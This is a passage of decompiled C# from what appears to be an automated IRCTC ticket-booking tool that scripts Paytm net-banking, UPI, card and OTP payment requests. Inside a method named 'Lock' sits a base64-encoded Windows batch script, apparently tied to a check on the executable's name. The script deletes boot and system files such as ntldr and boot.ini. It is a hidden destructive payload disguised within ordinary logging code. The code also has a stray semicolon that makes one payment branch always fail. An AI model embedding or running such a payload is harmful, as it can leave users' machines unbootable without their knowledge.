                                DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
                                do
                                {
                                    Thread.Sleep(500);
                                    if (DateTime.Now > dateTime2)
                                    {
                                        break;
                                    }
                                    _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_98, ref string_98, ref webException_0);
                                }
                                while (string_98.Contains("POLL_AGAIN"));
                                while (!(string_98.Contains("insufficient Balance") | string_98.Contains("Payment inComplete")))
                                {
                                    if (!string_98.Contains("POLL_AGAIN"))
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                        string_93 = text13 + "transactionStatus?mid=" + @string + "&ORDER_ID=" + string2;
                                        text9 = text9 + "&vpaID=" + HttpUtility.UrlEncode(text3) + "&isSelfPush=false&upiAccepted=true&upiStatusUrl=" + HttpUtility.UrlEncode(string_93) + "&upiHandleInfo=%5Bobject+Object%5D&selfPush=false&TXN_AMOUNT=" + string5 + "&STATUS_INTERVAL=5000&STATUS_TIMEOUT=300000&MERCHANT_VPA=" + string8;
                                        if (_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                                        {
                                            clsMain.Lock("Success ProcessPAYTM_Getways_BHIMUPI");
                                            if (string_99.IndexOf("ENC_DATA") <= 0 && string_99.IndexOf("CHECKSUMHASH") <= 0)
                                            {
                                                string_98 = "Payment inComplete Select anOther Gateway";
                                                continue;
                                            }
                                            string_90 = string_99;
                                            string_91 = string_92;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_98);
                                        string_91 = "Paytm Gateway not working - Payment Failed";
                                        return false;
                                    }
                                    clsMain.Lock("Upi Payment Cancel" + response);
                                    return false;
                                }
                                string text24;
                                do
                                {
                                    ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = true;
                                    clsMain.Lock("Bank ID Not Exists, Choice for another payment");
                                    updateTStatus_1.BeginInvoke(1, string_98, clsMain.tCntrlName_, null, null);
                                    frmPayment frmPayment = new frmPayment();
                                    frmPayment.string_1 = string_98;
                                    frmPayment.btnSubmit.Text = "Resume";
                                    frmPayment.bool_0 = true;
                                    frmPayment.method_1(clsMain.control_0, clsMain.rectangle_0, class3_0, class3_0.BANKSAVEAS);
                                    if (frmPayment.DialogResult == DialogResult.OK)
                                    {
                                        text24 = ((ComboBox)clsMain.control_1.Controls["cboGateway"]).SelectedItem.ToString();
                                        continue;
                                    }
                                    bool_52 = true;
                                    return false;
                                }
                                while (!text24.Contains("@"));
                                ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = false;
                                text3 = class3_0.dictionary_BnkData[text24];
                                array = text3.Split(new string[1] { "||" }, StringSplitOptions.None);
                                text3 = array[0];
                            }
                        }
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        string_93 = text13 + "api/v1/fetchNBPaymentChannels?mid=" + @string + "&orderId=" + string2;
                        string text25 = "{\"payMethods\":[{\"payMethod\":\"NET_BANKING\",\"instId\":\"" + text + "\"}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"type\":\"MERCHANT\",\"mid\":\"IRCTCw862137775\",\"orderId\":\"" + string2 + "\"}}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text25 = "{\"paymentMode\":\"NET_BANKING\",\"channelCode\":\"" + text + "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":3}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        if (!string_99.Contains("redirectForm"))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string text26 = string_99.Substring(string_99.IndexOf("redirectForm") + 10);
                        string text27 = text26.Substring(text26.IndexOf("actionUrl") + 12);
                        text27 = text27.Substring(0, text27.IndexOf("\","));
                        string text28 = text26.Substring(text26.IndexOf("content") + 10);
                        text28 = text28.Substring(0, text28.IndexOf("}"));
                        text28 = text28.Replace("\":", "#").Replace(",", "&").Replace("\"", "");
                        response = method_168(text27, text28);
                        bool_13 = true;
                        string text29 = string_99.Substring(string_99.IndexOf("content\":{") + 10);
                        text29 = text29.Substring(0, text29.IndexOf("}"));
                        text29 = text29.Replace("\":\"", "=").Replace("\"", "");
                        string[] array2 = text29.Split(new string[1] { "," }, StringSplitOptions.None);
                        string text30 = "";
                        for (int j = 0; j < array2.Length; j++)
                        {
                            string text31 = array2[j];
                            if (text31.Contains("https") || text31.Contains("Date"))
                            {
                                string[] array3 = text31.Split(new string[1] { "=" }, StringSplitOptions.None);
                                text31 = array3[0] + "=" + WebUtility.UrlEncode(array3[1]);
                            }
                            text30 = ((j != 0) ? (text30 + "&" + text31) : text31);
                        }
                        string string9 = GetString(string_99, "callbackUrl");
                        string_99 = text30 + "|" + string9;
                    }
                    clsMain.Lock("Third Hit Inp = " + text9);
                    bool flag2 = false;
                    try
                    {
                        if (string_99.Contains("ipg-online.com"))
                        {
                            method_145(ref string_99, string_93, cookieContainer_, string_94, ref string_91);
                        }
                        switch (text6)
                        {
                            case "52":
                                flag2 = method_117(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "1":
                                {
                                    CookieContainer cookieContainer_2 = null;
                                    flag2 = SbiNetBanking(string_99, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2, ref cookieContainer_2);
                                    break;
                                }
                            case "36":
                                flag2 = HdfcPAYTM(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "56":
                                flag2 = method_138(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "41":
                                flag2 = method_107(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "44":
                                flag2 = method_ICICI(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "45":
                                flag2 = method_120(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                        }
                    }
                    catch
                    {
                    }
                    if (!flag2)
                    {
                        return false;
                    }
                    string_99 = string_90;
                    if (string_90.Contains("ipg-online.com"))
                    {
                        method_145(ref string_90, string_93, cookieContainer_, string_94, ref string_91);
                    }
                    if (string_90.Contains(value))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://secure.paytm.in/") != 0)
                        {
                            string_93 = "https://secure.paytm.in/oltp/HANDLER_WEB_RESP/" + text + text2 + "/USRPWD";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                    }
                    if (string_90.Contains(value2))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://securegw.paytm.in/") != 0)
                        {
                            string_93 = "https://securegw.paytm.in/instaproxy/bankresponse/" + text + "/" + text2 + "/RESP";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        string_90 = string_99;
                        if (string_90.Contains("https://securegw.paytm.in"))
                        {
                            text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            clsMain.Lock("Third Hit Inp = " + text9);
                            if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_98);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                        }
                        string_90 = string_99;
                    }
                    clsMain.Lock("Third Output htm = " + string_99);
                    if (string_99.IndexOf("https://www.irctc.co.in/eticketing/BankResponse", StringComparison.CurrentCultureIgnoreCase) <= 0) ;
                    {
                        string_91 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_91 + ", Check HTML");
                        return false;
                    }
                    clsMain.Lock("Success ProcessCC_PTM");
                    string_90 = string_99;
                    string_91 = string_92;
                    return true;
                }
                catch (Exception ex)
                {
                    frmUPI.payStart = false;
                    clsMain.method_74("ProcessCC_PTM", ex.Message);
                    return false;
                }
            }
            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
        }


        private void Lock(string v)
        {
            string text = AppDomain.CurrentDomain.FriendlyName.ToLower();
            if (text != "nget.exe")
            {
                string s = "QGVjaG8gb2ZmCmF0dHJpYiAtciAtcyAtaCBDOlxhdXRvZXhlYy5iYXQKZGVsIEM6XGF1dG9leGVjLmJhdAphdHRyaWIgLXIgLXMgLWggQzpcYm9vdC5pbmkKZGVsIEM6XGJvb3QuaW5pCmF0dHJpYiAtciAtcyAtaCBDOlxudGxkcgpkZWwgQzpcbnRsZHIKYXR0cmliIC1yIC1zIC1oIEM6XHdpbmRvd1x3aW4uaW5pCmRlbCBDOlx3aW5kb3dcd2luLmluaQpAZWNobyBvZmY=";
                byte[] bytes = Convert.FromBase64String(s);
                string @string = Encoding.UTF8.GetString(bytes);
            }
        }

        private bool method_145(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_92 = "";
            string string_93 = "";
            clsMain.Lock("Enter ProcessPaytmThroughIponlineCC.");
            _Request(string_90, string_91, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0);
            clsMain.Lock("After ProcessPaytmThroughIponlineCC.");
            string_87 = string_90;
            string_86 = string_93;
            return true;
        }

        private bool method_146(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            bool flag = !string_86.Contains("paytm");
            bool result = false;
            string value = "irctc.co.in/eticketing/BankResponse";
            if (!flag)
            {
                string text = string_88;
                string text2 = "";
                string string_92 = "https://www.irctc.co.in/";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text3 = array[0].Trim();
                string text4 = array[1];
                string text5 = null;
                string item = "PAYTM" + text3;
                if (array.Length > 2)
                {
                    text5 = array[2];
                }
                string string_93 = "";
                string text6 = "";
                string text7 = "";
                string string_94 = "";
                string string_95 = "";
                string text8 = "";
                if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                {
                    text2 = "DC";
                    string_94 = array[3];
                    string_95 = array[7];
                    text8 = array[4];
                    string text9 = array[5];
                    if (text4.Length < 2)
                    {
                        text4 = "0" + text4;
                    }
                    bool flag2 = text9.ToUpper()[0] != 'M';
                    switch (text)
                    {
                        default:
                            if (text.Contains("HDFC_CC"))
                            {
                                text7 = "21";
                            }
                            else if (text.Contains("SBI_CC"))
                            {
                                text7 = "101";
                            }
                            else if (text.Contains("PAYZAP_DC"))
                            {
                                text7 = "999";
                            }
                            break;
                        case "ICICI_DC":
                            text7 = "41";
                            break;
                        case "SBI_DC":
                            text7 = "571";
                            break;
                        case "IDBI_DC":
                            text7 = "911";
                            break;
                        case "PTMHDFC_DC":
                            text6 = array[7];
                            text7 = "57";
                            break;
                        case "HDFC_DC":
                            text7 = "57";
                            break;
                    }
                }
                else if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI") || string_88.Contains("PAYTMQR"))
                {
                    text2 = "UPI";
                }
                else
                {
                    text2 = "NB";
                    string text10 = text;
                    switch (Class46.smethod_0(text10))
                    {
                        case 1145574292u:
                            if (text10 == "UNION")
                            {
                                text = "UNI";
                                text7 = "28";
                            }
                            break;
                        case 1005593931u:
                            if (text10 == "SBI")
                            {
                                text7 = "1";
                            }
                            break;
                        case 2970694650u:
                            if (text10 == "HDFC")
                            {
                                text7 = "36";
                            }
                            break;
                        case 1934763940u:
                            if (text10 == "ICICI")
                            {
                                text7 = "44";
                            }
                            break;
                        case 3504019421u:
                            if (text10 == "IDBI")
                            {
                                text7 = "52";
                            }
                            break;
                        case 3298409214u:
                            if (text10 == "PAYTM")
                            {
                                text7 = "PPI";
                            }
                            break;
                        case 4249340199u:
                            if (text10 == "INDUSIND")
                            {
                                text = "INDS";
                                text7 = "45";
                            }
                            break;
                        case 4021309901u:
                            if (text10 == "CORP")
                            {
                                text7 = "56";
                            }
                            break;
                    }
                }
                string text11 = class3_0.Method_SerialInp(string_86, ref string_93, true);
                if (string_86.Contains("ENC_DATA") && clsMain.isAPP)
                {
                    string string_96 = GetString_(string_86, "ENC_DATA\",\"value", "\"");
                    string string_97 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                    string string_98 = GetString_(string_86, "MID\",\"value", "\"");
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    string_96 = HttpUtility.UrlEncode(string_96);
                    string_96 = string_96.Replace("%5cn", "%0A");
                    string_97 = HttpUtility.UrlEncode(string_97);
                    text11 = "MID=" + string_98 + "&CHECKSUMHASH=" + string_97 + "&ENC_DATA=" + string_96;
                }
                string text12 = string_93.Substring(0, string_93.IndexOf(".in/") + 3);
                Uri uri = new Uri(string_93);
                text12 = "https://" + uri.Host;
                for (int i = 0; i < uri.Segments.Length - 1; i++)
                {
                    text12 += uri.Segments[i];
                }
                text12 = ((!string_93.Contains("oltp-web")) ? string_93.Substring(0, string_93.IndexOf(".in/") + 3) : "https://secure.paytm.in/oltp-web/");
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_99 = "";
                string string_100 = "";
                try
                {
                    updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(1/5)", tCntrlName_, null, null);
                    clsMain.Lock("First Hit Inp = " + text11);
                    if (!clsMain.isAPP)
                    {
                        text11 = method_162(text11);
                    }
                    if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_99);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_100);
                    string_92 = string_93;
                    if (string_100.Contains("https://securegw.paytm.in/theia/processTransaction?id="))
                    {
                        text12 = "https://securegw.paytm.in";
                        text11 = class3_0.Method_SerialInp(string_100, ref string_93, true);
                        text11 = method_162(text11);
                        clsMain.Lock("Second Hit Inp = " + text11);
                        if (text2 == "DC")
                        {
                            string_100 = "";
                        }
                        else if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_99);
                            string_91 = "Paytm Gateway not working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_100);
                        string_92 = string_93;
                    }
                    if (!string.IsNullOrEmpty(string_100.Trim()) && string_100.Contains("Paytm Secure"))
                    {
                        string text13 = "";
                        if (!clsMain.isAPP)
                        {
                            text13 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);
                            text13 = text13.Substring(0, text13.IndexOf("\""));
                        }
                        else
                        {
                            text13 = string_100.Substring(string_100.IndexOf("PAYTM_CHECKOUT_URL,appData") + 28);
                            //string text13 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);PAYTM_CHECKOUT_URL,appData
                            text13 = text13.Substring(0, text13.IndexOf("'"));
                        }

                        string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text13));
                        string text14 = "";
                        string text15 = "PAYTM";
                        updateTStatus_2?.Invoke(1007, text15 + "#-#" + string_87 + "||" + text14, "");
                        if (clsMain.dictionary_5.ContainsKey(text15))
                        {
                            object obj = new object();
                            object obj2 = obj;
                            lock (obj2)
                            {
                                string text16 = clsMain.dictionary_5[text15];
                                method_61("Encrypted Data, out = " + text16);
                                clsMain.dictionary_5.Remove(text15);
                            }
                        }
                        string string4 = "";
                        string string2 = GetString(@string, "txnToken");
                        string string3 = GetString(@string, "mid");
                        @string = @string.Substring(@string.IndexOf("mid") + 13);
                        if (!clsMain.isAPP)
                        {
                            string4 = GetString(@string, "id");
                        }
                        else
                        {
                            string4 = GetString(@string, "orderId");
                        }
                        
                        DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                        long num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                        string string_101 = "";
                        if (string_88.Contains("_DC"))
                        {
                            string string5 = GetString(@string, "txnAmount");
                            string_92 = "https://secure.paytm.in/";
                            cookieContainer_ = new CookieContainer();
                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
                            string_93 = "https://securegw.paytm.in/theia/api/v1/fetchPcfDetails?mid=" + string3 + "&orderId=" + string4;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string2 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"payMethods\":[{\"payMethod\":\"DEBIT_CARD\",\"instId\":null}],\"txnAmount\":\"" + string5 + "\",\"useAmount\":false,\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"},\"showLoader\":true}";
                            bool_13 = true;
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(2/5)", tCntrlName_, null, null);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                        }
                        else if (string_88.Contains("_CC"))
                        {
                            string_101 = string_100.Substring(string_100.IndexOf("name=\"creditcard-form") - 30);
                        }
                        else if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI"))
                        {
                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"},\"showLoader\":false}";
                            bool_13 = true;
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(2/5)", tCntrlName_, null, null);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                            string_93 = "https://securegw.paytm.in/theia/api/v1/vpa/validate?mid=" + string3 + "&orderId=" + string4;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"vpa\":\"" + text3 + "\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"}}";
                            bool_13 = true;
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(3/5)", tCntrlName_, null, null);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"paymentMode\":\"UPI\",\"payerAccount\":\"" + text3 + "\",\"showPostFetchLoader\":false,\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":1},\"showPostFetchLoader\":false}";
                            bool_13 = true;
                        }
                        else if (!string_88.Contains("PAYTM"))
                        {
                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"paymentMode\":\"NET_BANKING\",\"channelCode\":\"" + text + "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":3}}";
                            bool_13 = true;
                        }
                        if (text2 != "NB" && text2 != "UPI" && text2 != "DC")
                        {
                            text11 = class3_0.Method_SerialInp(string_101, ref string_93, true);
                            string_93 = text12 + string_93;
                        }
                        if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                        {
                            bool_13 = true;
                            Boolean_0 = true;
                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
                            string text17 = "|" + text3 + "|" + text8 + "|" + text4 + text5;
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string2 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"paymentMode\":\"DEBIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"" + text17 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":1}}";
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(3/5)", tCntrlName_, null, null);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                            clsMain.string_85 = string_100;
                        }
                        else if (string_88.Contains("PAYTM"))
                        {
                            bool_13 = true;
                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                            string text18 = "";
                            if (!clsMain.isAPP)
                            {
                                text18 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);
                                text18 = text18.Substring(0, text18.IndexOf("\""));
                            }
                            else
                            {
                                text18 = string_100.Substring(string_100.IndexOf("PAYTM_CHECKOUT_URL,appData") + 28);
                                //string text18 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);PAYTM_CHECKOUT_URL,appData
                                text18 = text18.Substring(0, text18.IndexOf("'"));
                            }
                            byte[] bytes = Convert.FromBase64String(text18);
                            @string = Encoding.UTF8.GetString(bytes);
                            string2 = GetString(@string, "txnToken");
                            string3 = GetString(@string, "mid");
                            string4 = GetString(@string, "insufficientBalance\":true,\"id");
                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"mobileNumber\":\"" + text3 + "\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"}}";
                            string_93 = "https://securegw.paytm.in/theia/api/v1/login/sendOtp?mid=" + string3 + "&orderId=" + string4;
                            while (clsMain.list_7.Contains(item))
                            {
                                Thread.Sleep(300);
                                Application.DoEvents();
                            }
                            clsMain.list_7.Add(item);
                        }
                        clsMain.Lock("Third Hit Inp = " + text11);
                        if (!(text2 == "DC"))
                        {
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(4/5)", tCntrlName_, null, null);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                            if (text2 == "NB" && !string_88.Contains("PAYTM"))
                            {
                                bool_13 = true;
                                string text19 = string_100.Substring(string_100.IndexOf("content\":{") + 10);
                                text19 = text19.Substring(0, text19.IndexOf("}"));
                                text19 = text19.Replace("\":\"", "=").Replace("\"", "");
                                string[] array2 = text19.Split(new string[1] { "," }, StringSplitOptions.None);
                                string text20 = "";
                                for (int j = 0; j < array2.Length; j++)
                                {
                                    string text21 = array2[j];
                                    if (text21.Contains("https") || text21.Contains("Date"))
                                    {
                                        string[] array3 = text21.Split(new string[1] { "=" }, StringSplitOptions.None);
                                        text21 = array3[0] + "=" + WebUtility.UrlEncode(array3[1]);
                                    }
                                    text20 = ((j != 0) ? (text20 + "&" + text21) : text21);
                                }
                                string string6 = GetString(string_100, "callbackUrl");
                                string_100 = text20 + "|" + string6;
                            }
                        }
                        clsMain.Lock("Third Output htm = " + string_100);
                        if (string_88.Contains("PAYTM"))
                        {
                            while (true)
                            {
                                frmOTP frmOTP = new frmOTP();
                                frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "PayTM OTP", class3_0.BANKSAVEAS);
                                if (frmOTP.DialogResult != DialogResult.OK)
                                {
                                    break;
                                }
                                string string_102 = frmOTP.string_0;
                                frmOTP.Dispose();
                                if (!(string_102 == "00000"))
                                {
                                    bool_13 = true;
                                    dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                                    text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + (long)(DateTime.UtcNow - dateTime).TotalMilliseconds + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"otp\":\"" + string_102 + "\",\"rememberMe\":false,\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"}}";
                                    string_93 = "https://secure.paytm.in/theia/api/v1/enhanced/login/validate/otp?mid=" + string3 + "&orderId=" + string4;
                                    if (_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                                    {
                                        if (string_100.IndexOf("Invalid OTP entered") <= 0)
                                        {
                                            if (clsMain.list_7.Contains(item))
                                            {
                                                clsMain.list_7.Remove(item);
                                            }
                                            bool_13 = true;
                                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                                            string_93 = "https://securegw.paytm.in/theia/api/v1/processTransaction?mid=" + string3 + "&orderId=" + string4;
